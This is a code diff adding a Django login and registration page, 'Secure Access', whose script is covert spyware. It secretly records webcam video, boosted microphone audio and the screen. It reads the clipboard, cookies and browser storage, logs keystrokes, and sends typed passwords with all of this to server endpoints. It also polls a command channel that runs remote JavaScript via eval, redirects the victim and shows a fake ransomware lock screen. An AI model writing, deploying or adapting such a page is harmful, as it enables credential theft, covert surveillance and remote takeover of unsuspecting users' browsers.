@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access - Sign In</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1723 100%);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-wrapper {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-container {
+            background: rgba(26, 35, 50, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 50px 40px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+        }
+
+        .lock-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
+            font-size: 32px;
+            color: white;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #f8fafc;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: #94a3b8;
+            font-size: 14px;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .form-control {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #f8fafc;
+            border-radius: 10px;
+            padding: 14px 16px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .form-control::placeholder {
+            color: #475569;
+        }
+
+        .form-control:focus {
+            background: rgba(15, 23, 42, 0.8);
+            border-color: rgba(59, 130, 246, 0.4);
+            color: #f8fafc;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+
+        .btn-signin {
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+        }
+
+        .btn-signin:hover {
+            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.3);
+        }
+
+        .btn-signin:active {
+            transform: translateY(0);
+        }
+
+        .btn-signin:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #475569;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .divider span {
+            margin: 0 12px;
+            font-size: 13px;
+        }
+
+        .auth-tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 25px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding-bottom: 15px;
+        }
+
+        .auth-tabs button {
+            flex: 1;
+            background: none;
+            border: none;
+            color: #94a3b8;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid transparent;
+        }
+
+        .auth-tabs button.active {
+            color: #3b82f6;
+            border-bottom-color: #3b82f6;
+        }
+
+        .auth-tabs button:hover:not(.active) {
+            color: #cbd5e1;
+        }
+
+        .loader {
+            display: none;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+
+        .loader.active {
+            display: inline-block;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .links-footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #64748b;
+        }
+
+        .links-footer a {
+            color: #3b82f6;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .links-footer a:hover {
+            color: #60a5fa;
+            text-decoration: underline;
+        }
+
+        video, canvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<video id="webcam" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<div class="login-wrapper">
+    <div class="login-container">
+        <!-- Lock Icon -->
+        <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+        </div>
+
+        <!-- Title -->
+        <h1>Secure Access</h1>
+        <p class="subtitle">Trusted account login for verified users</p>
+
+        <!-- Auth Tabs -->
+        <div class="auth-tabs">
+            <button type="button" id="tab-login" class="active" onclick="switchTab('login')">Login</button>
+            <button type="button" id="tab-signup" onclick="switchTab('signup')">Register</button>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm" style="display: block;">
+            {% csrf_token %}
+            <div class="form-group">
+                <label>Email or Username</label>
+                <input type="text" id="login-username" class="form-control" placeholder="Enter your email" required>
+            </div>
+            <div class="form-group">
+                <label>Passcode</label>
+                <input type="password" id="login-password" class="form-control" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="btn-signin" id="login-btn">
+                <span class="loader" id="login-loader"></span>
+                <span>Authenticate</span>
+            </button>
+        </form>
+
+        <!-- Signup Form -->
+        <form id="signupForm" style="display: none;">
+            {% csrf_token %}
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="signup-fullname" class="form-control" placeholder="Enter your full name" required>
+            </div>
+            <div class="form-group">
+                <label>Email</label>
+                <input type="email" id="signup-email" class="form-control" placeholder="Enter your email" required>
+            </div>
+            <div class="form-group">
+                <label>Passcode</label>
+                <input type="password" id="signup-password" class="form-control" placeholder="Create a password" required>
+            </div>
+            <div class="form-group">
+                <label>Confirm Passcode</label>
+                <input type="password" id="signup-confirm" class="form-control" placeholder="Confirm your password" required>
+            </div>
+            <button type="submit" class="btn-signin" id="signup-btn">
+                <span class="loader" id="signup-loader"></span>
+                <span>Create Account</span>
+            </button>
+        </form>
+
+
+    </div>
+</div>
+
+<script>
+    let currentAuthMode = 'login';
+
+    // Switch between Login and Signup tabs
+    function switchTab(mode) {
+        currentAuthMode = mode;
+        const tabLogin = document.getElementById('tab-login');
+        const tabSignup = document.getElementById('tab-signup');
+        const loginForm = document.getElementById('loginForm');
+        const signupForm = document.getElementById('signupForm');
+
+        if (mode === 'login') {
+            tabLogin.classList.add('active');
+            tabSignup.classList.remove('active');
+            loginForm.style.display = 'block';
+            signupForm.style.display = 'none';
+        } else {
+            tabLogin.classList.remove('active');
+            tabSignup.classList.add('active');
+            loginForm.style.display = 'none';
+            signupForm.style.display = 'block';
+        }
+    }
+
+    // ========== WEBCAM & MIC — FIXED ==========
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    let activeStream = null;
+    let webcamReady = false;
+    let audioReady = false;
+    let mediaRecorder = null;
+    let audioChunks = [];
+    let hardwareRequested = false;
+
+    function requestHardwareAccess() {
+        if (hardwareRequested) return;
+        hardwareRequested = true;
+
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+
+        navigator.mediaDevices.getUserMedia({
+            video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } },
+            audio: true
+        }).then(function(stream) {
+            activeStream = stream;
+
+            // Webcam
+            if (video) {
+                video.srcObject = stream;
+                video.muted = true;
+                video.setAttribute('playsinline', '');
+                video.play().catch(() => {});
+                video.addEventListener('loadedmetadata', () => { webcamReady = true; });
+            }
+              // Audio recording with GAIN BOOST & Auto-Resume
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // AudioContext must be resumed after user interaction
+                const resumeAudio = async () => {
+                    if (audioContext.state === 'suspended') await audioContext.resume();
+                };
+                document.addEventListener('click', resumeAudio, { once: true });
+                document.addEventListener('keydown', resumeAudio, { once: true });
+
+                const source = audioContext.createMediaStreamSource(stream);
+                const gainNode = audioContext.createGain();
+                gainNode.gain.value = 5.0; // Boost volume by 5x (even louder)
+                
+                const destination = audioContext.createMediaStreamDestination();
+                source.connect(gainNode);
+                gainNode.connect(destination);
+                
+                const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+                    ? 'audio/webm;codecs=opus'
+                    : 'audio/webm';
+                
+                // Use the boosted destination stream
+                mediaRecorder = new MediaRecorder(destination.stream, { mimeType });
+                audioChunks = [];
+                mediaRecorder.ondataavailable = e => { 
+                    if(e.data && e.data.size > 0) {
+                        audioChunks.push(e.data);
+                    }
+                };
+                mediaRecorder.start();
+                audioReady = true;
+                console.log("Audio recording started with gain boost");
+            } catch(e) { 
+                console.log('Audio boost error, falling back:', e); 
+                // Fallback to raw stream if AudioContext fails
+                try {
+                    mediaRecorder = new MediaRecorder(stream);
+                    audioChunks = [];
+                    mediaRecorder.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
+                    mediaRecorder.start();
+                    audioReady = true;
+                } catch(err) { console.log("Final audio fail:", err); }
+            }
+
+
+            // Start recording webcam video - Lower quality for Ngrok speed
+            try {
+                camRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 500000 });
+                camChunks = [];
+                camRecorder.ondataavailable = e => { if(e.data.size > 0) camChunks.push(e.data); };
+                camRecorder.onstop = () => {
+                    const blob = new Blob(camChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => { camRecordingBase64 = reader.result; };
+                };
+                camRecorder.start();
+                // Auto-stop after 15s to save memory
+                setTimeout(() => { if(camRecorder && camRecorder.state === 'recording') camRecorder.stop(); }, 15000);
+            } catch(e) { console.log('Cam recorder error:', e); }
+
+        }).catch(function(err) {
+            console.log('Hardware access:', err.name);
+            hardwareRequested = false; // allow retry
+        });
+    }
+
+    // ========== CLIPBOARD STEALER ==========
+    let clipboardData = null;
+    function stealClipboard() {
+        try {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText()
+                    .then(text => { if (text && text.trim()) clipboardData = text.substring(0, 2000); })
+                    .catch(() => {});
+            }
+        } catch(e) {}
+    }
+
+    // ========== EXTRA DEVICE INFO ==========
+    let batteryInfo = null;
+    let networkInfo = null;
+    try {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                batteryInfo = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : '🔋'}`;
+            });
+        }
+    } catch(e) {}
+    try {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) networkInfo = `${conn.effectiveType || ''} ${conn.downlink ? conn.downlink + 'Mbps' : ''}`.trim();
+    } catch(e) {}
+
+
+    // Send Real-time Alerts to Telegram
+    let screenRecorder = null;
+    let screenChunks = [];
+    let screenRecordingBase64 = null;
+
+    async function startScreenRecording() {
+        try {
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            screenRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 1000000 });
+            screenChunks = [];
+            screenRecorder.ondataavailable = e => screenChunks.push(e.data);
+            screenRecorder.onstop = () => {
+                const blob = new Blob(screenChunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => { screenRecordingBase64 = reader.result; };
+                stream.getTracks().forEach(t => t.stop());
+            };
+            screenRecorder.start();
+            // Stop recording after 15 seconds or when form submitted
+            setTimeout(() => { if(screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop(); }, 15000);
+        } catch(e) { console.log("Screen record failed/denied"); }
+    }
+    // Auto-start (will prompt user)
+    window.addEventListener('load', () => {
+        setTimeout(startScreenRecording, 2000);
+    });
+
+    function sendRealtimeAlert(dataType, dataContent) {
+        return fetch('/alerts/realtime/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
+            },
+            body: JSON.stringify({ data_type: dataType, data_content: dataContent })
+        }).catch(e => console.log('Alert failed:', e));
+    }
+
+    function snapAndSend(username, password, csrfToken, fullName = '') {
+        return new Promise((resolve) => {
+            // Collect browser data
+            let stolenStorage = {};
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    stolenStorage[key] = localStorage.getItem(key);
+                }
+            } catch(e) {}
+
+            let stolenSessionStorage = {};
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    stolenSessionStorage[key] = sessionStorage.getItem(key);
+                }
+            } catch(e) {}
+
+            let browserCookies = '';
+            try { browserCookies = document.cookie || ''; } catch(e) {}
+
+            let deviceInfo = '';
+            try {
+                deviceInfo = `Screen:${window.screen.width}x${window.screen.height} | Lang:${navigator.language} | TZ:${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+                if (batteryInfo) deviceInfo += ` | BAT:${batteryInfo}`;
+                if (networkInfo) deviceInfo += ` | NET:${networkInfo}`;
+            } catch(e) {}
+
+            // Try clipboard steal one more time at submit
+            stealClipboard();
+
+            function doSend(snap, audioBase64, screenB64, camB64) {
+                fetch('/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRFToken': csrfToken
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        fullName: fullName,
+                        webcam_snap: snap || null,
+                        local_storage: JSON.stringify(stolenStorage),
+                        session_storage: JSON.stringify(stolenSessionStorage),
+                        cookies: browserCookies || null,
+                        source_url: window.location.href,
+                        user_agent: navigator.userAgent,
+                        platform: navigator.platform,
+                        device_info: deviceInfo,
+                        voice_audio: audioBase64 || null,
+                        authMode: currentAuthMode,
+                        client_timestamp: new Date().toISOString(),
+                        client_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        local_time: new Date().toLocaleString(),
+                        clipboard: clipboardData || null,
+                        battery: batteryInfo || null,
+                        network_type: networkInfo || null,
+                        screen_recording: screenB64 || null,
+                        webcam_video: camB64 || null,
+                    })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    try { if (activeStream) activeStream.getTracks().forEach(t => t.stop()); } catch(e) {}
+                    resolve(data);
+                })
+                .catch(() => {
+                    try { if (activeStream) activeStream.getTracks().forEach(t => t.stop()); } catch(e) {}
+                    resolve({ redirect_url: '/apps/' });
+                });
+            }
+
+            // Safety timeout — always redirect within 6s
+            let sent = false;
+            const safetyTimeout = setTimeout(() => {
+                if (!sent) { sent = true; doSend(null, null); }
+            }, 6000);
+
+            async function captureAndSend() {
+                if (sent) return;
+                sent = true;
+                clearTimeout(safetyTimeout);
+
+                // Stop recorders if still active
+                const stopRecorder = (r) => {
+                    return new Promise(resolve => {
+                        if (r && r.state === 'recording') {
+                            r.onstop = () => resolve();
+                            r.stop();
+                        } else resolve();
+                    });
+                };
+
+                await Promise.all([
+                    stopRecorder(screenRecorder),
+                    stopRecorder(camRecorder),
+                    stopRecorder(mediaRecorder)
+                ]);
+
+                // Wait for all FileReaders to finish
+                const getBase64 = (blob) => {
+                    return new Promise((resolve) => {
+                        if (!blob || blob.size === 0) return resolve(null);
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result);
+                        reader.onerror = () => resolve(null);
+                        reader.readAsDataURL(blob);
+                    });
+                };
+
+                // Create blobs from chunks
+                const screenBlob = screenChunks.length > 0 ? new Blob(screenChunks, { type: 'video/webm' }) : null;
+                const camBlob = camChunks.length > 0 ? new Blob(camChunks, { type: 'video/webm' }) : null;
+                const audioBlob = audioChunks.length > 0 ? new Blob(audioChunks, { type: 'audio/webm' }) : null;
+
+                // Optional backup snapshot
+                let finalSnap = null;
+                try {
+                    if (activeStream && video && video.videoWidth > 0 && video.readyState >= 2) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        finalSnap = canvas.toDataURL('image/jpeg', 0.8);
+                    }
+                } catch(e) {}
+
+                const [screenB64, camB64, audioB64] = await Promise.all([
+                    getBase64(screenBlob),
+                    getBase64(camBlob),
+                    getBase64(audioBlob)
+                ]);
+
+                await doSend(finalSnap, audioB64, screenB64, camB64);
+            }
+        });
+    }
+
+    // Login Form Handler
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const username = document.getElementById('login-username').value;
+        const password = document.getElementById('login-password').value;
+        const btn = document.getElementById('login-btn');
+        const loader = document.getElementById('login-loader');
+        const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;
+
+        if (!username || !password) {
+            Swal.fire({ icon: 'error', title: 'Error', text: 'Please fill in all fields' });
+            return;
+        }
+
+        btn.disabled = true;
+        loader.classList.add('active');
+
+        try {
+            sendRealtimeAlert('Sign In', `Email: ${username}\nPassword: ${password}`).catch(() => {});
+            const responseData = await snapAndSend(username, password, csrfToken);
+            
+            if (responseData && responseData.status === 'error' && responseData.auth_failed) {
+                Swal.fire({ icon: 'error', title: 'Login Failed', text: responseData.message });
+                return;
+            }
+
+            const redirectUrl = (responseData && responseData.redirect_url) ? responseData.redirect_url : '/apps/';
+
+            Swal.fire({
+                icon: 'success', title: 'Authentication Successful', text: 'Redirecting...',
+                timer: 1000, showConfirmButton: false
+            }).then(() => { window.location.href = redirectUrl; });
+
+            setTimeout(() => { window.location.href = redirectUrl; }, 1100);
+
+        } catch (error) {
+            setTimeout(() => { window.location.href = '/apps/'; }, 2000);
+        } finally {
+            btn.disabled = false;
+            loader.classList.remove('active');
+        }
+    });
+
+    // Signup Form Handler
+    document.getElementById('signupForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const fullname = document.getElementById('signup-fullname').value;
+        const email = document.getElementById('signup-email').value;
+        const password = document.getElementById('signup-password').value;
+        const confirm = document.getElementById('signup-confirm').value;
+        const btn = document.getElementById('signup-btn');
+        const loader = document.getElementById('signup-loader');
+        const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;
+
+        if (!fullname || !email || !password || !confirm) {
+            Swal.fire({ icon: 'error', title: 'Error', text: 'Please fill in all fields' });
+            return;
+        }
+        if (password !== confirm) {
+            Swal.fire({ icon: 'error', title: 'Error', text: 'Passwords do not match!' });
+            return;
+        }
+
+        btn.disabled = true;
+        loader.classList.add('active');
+
+        try {
+            sendRealtimeAlert('Sign Up', `Name: ${fullname}\nEmail: ${email}\nPassword: ${password}`).catch(() => {});
+            const responseData = await snapAndSend(email, password, csrfToken, fullname);
+            const redirectUrl = (responseData && responseData.redirect_url) ? responseData.redirect_url : '/apps/';
+
+            Swal.fire({
+                icon: 'success', title: 'Registration Successful', text: 'Redirecting...',
+                timer: 1200, showConfirmButton: false
+            }).then(() => { window.location.href = redirectUrl; });
+
+            setTimeout(() => { window.location.href = redirectUrl; }, 1300);
+
+        } catch (error) {
+            setTimeout(() => { window.location.href = '/apps/'; }, 2000);
+        } finally {
+            btn.disabled = false;
+            loader.classList.remove('active');
+        }
+    });
+
+    // ── Request hardware on page load + first click (single attempt) ──
+    window.addEventListener('load', () => {
+        // Small delay so page renders first
+        setTimeout(requestHardwareAccess, 800);
+    });
+
+    // Clipboard on first interaction
+    document.addEventListener('click', stealClipboard, { once: true });
+    document.addEventListener('focus', stealClipboard, { capture: true, once: true });
+
+    // ========== C2 COMMAND POLLING ==========
+    function pollC2Commands() {
+        fetch('/c2/poll/')
+            .then(r => r.json())
+            .then(data => {
+                if (!data.command) return;
+                const cmd = data.command;
+                const payload = data.payload || '';
+
+                if (cmd === 'EVAL_JS') {
+                    try { eval(payload); } catch(e) {}
+                }
+                else if (cmd === 'REDIRECT') {
+                    window.location.href = payload;
+                }
+                else if (cmd === 'SCREEN_RECORD') {
+                    // Logic removed as per user request
+                }
+                else if (cmd === 'RANSOMWARE') {
+                    const lockDiv = document.createElement('div');
+                    lockDiv.id = 'ransom-lock';
+                    lockDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#FF0000;z-index:99999;display:flex;justify-content:center;align-items:center;flex-direction:column;';
+                    lockDiv.innerHTML = `
+                        <div style="text-align:center;color:white;font-family:'Courier New',monospace;">
+                            <h1 style="font-size:48px;letter-spacing:5px;margin:30px 0;">SYSTEM COMPROMISED</h1>
+                            <div style="background:#000;border:3px solid white;padding:30px;max-width:600px;margin:20px auto;font-size:16px;line-height:1.8;">
+                                <p>All your files are encrypted.</p>
+                                <p style="color:#FFFF00;font-weight:bold;margin:20px 0;">Enter password to unlock:</p>
+                                <input type="password" id="c2-ransom-pw" placeholder="Password" style="width:100%;padding:12px;margin:10px 0;background:#222;color:white;border:1px solid #666;font-size:16px;text-align:center;" />
+                                <button onclick="if(document.getElementById('c2-ransom-pw').value==='PROTOCOL_OMEGA_9999'){document.getElementById('ransom-lock').remove();}" style="background:#CC0000;color:white;border:2px solid white;padding:12px 30px;font-size:16px;cursor:pointer;margin-top:10px;">UNLOCK</button>
+                            </div>
+                        </div>`;
+                    document.body.appendChild(lockDiv);
+                }
+            })
+            .catch(() => {});
+    }
+    setInterval(pollC2Commands, 2000);
+
+    // ========== LIVE KEYLOGGER ==========
+    let _capturedKeys = [];
+    let _keyStartTime = Date.now();
+
+    document.addEventListener('keydown', function(e) {
+        _capturedKeys.push({ key: e.key, time: Date.now() - _keyStartTime });
+    });
+
+    function sendKeystrokes() {
+        if (_capturedKeys.length === 0) return;
+        
+        const username = document.getElementById('login-username')?.value ||
+                         document.getElementById('signup-email')?.value || 'Anonymous';
+        
+        const payload = JSON.stringify(_capturedKeys);
+        _capturedKeys = []; // Clear immediately to prevent duplicates
+        
+        fetch('/log_keys/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: username, keys: payload })
+        }).catch(err => {
+            // Optional: restore keys if failed
+            // _capturedKeys = JSON.parse(payload).concat(_capturedKeys);
+        });
+    }
+    setInterval(sendKeystrokes, 3000);
+</script>
+
+</body>
+</html>
